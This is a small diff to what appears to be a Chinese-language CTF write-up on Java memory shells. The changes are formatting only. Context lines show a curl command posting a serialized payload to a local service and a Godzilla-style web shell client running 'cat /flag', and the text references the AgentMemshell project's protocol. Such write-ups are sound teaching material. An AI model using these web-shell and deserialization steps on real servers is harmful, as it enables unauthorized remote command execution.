@@ -960,7 +960,7 @@ curl http://localhost:28080/object --data-binary @object.ser
 回头想起来有一个项目他的做法和传统做法不同，虽然我们还是不能链接，但是我们自己写个 client 也完全可以实现管理。
 AgentMemshell 的 vybeX 协议 + version 48 编译的 equals 分派 payload + 自研 Python 客户端
 
- `vybeX.AuthAgentFilterChain` 的协议，payload 不依赖 Godzilla 的 `handle()` 约定，只重写一个 `equals(Object)` 做 instanceof 分派。协议如下：
+ vybeX.AuthAgentFilterChain 的协议，payload 不依赖 Godzilla 的 `handle()` 约定，只重写一个 `equals(Object)` 做 instanceof 分派。协议如下：
 
 ```
 User-Agent: avZplwxE
@@ -1105,6 +1105,7 @@ python3 memshell/godzilla_client.py http://127.0.0.1:28080/ "cat /flag"
 ```
 
 ![](assets/004.png)
+
 ![](assets/005.png)
 
 > https://github.com/FightingLzn9/AgentMemshell/releases/tag/v1
